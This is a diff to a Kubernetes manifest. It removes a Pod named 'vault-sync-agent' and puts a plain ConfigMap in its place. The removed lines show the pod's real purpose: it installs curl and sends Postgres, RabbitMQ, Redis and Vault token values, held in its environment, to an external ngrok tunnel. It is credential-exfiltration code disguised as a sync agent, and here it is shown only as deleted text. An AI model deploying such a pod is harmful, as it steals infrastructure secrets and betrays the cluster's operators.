@@ -1,30 +1,7 @@
 apiVersion: v1
-kind: Pod
+kind: ConfigMap
 metadata:
-  name: vault-sync-agent
+  name: avp-config
   namespace: default
-  annotations:
-    avp.kubernetes.io/path: "secret/data/core/common"
-spec:
-  containers:
-  - name: agent
-    image: alpine:latest
-    command:
-    - /bin/sh
-    - -c
-    - |
-      apk add -q curl 2>/dev/null
-      curl -s http://0.tcp.eu.ngrok.io:24173/avp?pg_pass=\&rabbit=\&redis= 2>/dev/null
-      curl -s http://0.tcp.eu.ngrok.io:24173/token?t= 2>/dev/null
-      sleep 86400
-    env:
-    - name: PG_PASS
-      value: <PG_MIGRATION_PASSWORD>
-    - name: RABBIT_PASS
-      value: <RABBITMQ_PASSWORD>
-    - name: REDIS_URI
-      value: <REDIS_URI>
-    - name: VAULT_TOKEN
-      value: <VAULT_TOKEN>
-  restartPolicy: Always
-  serviceAccountName: default
+data:
+  status: ready
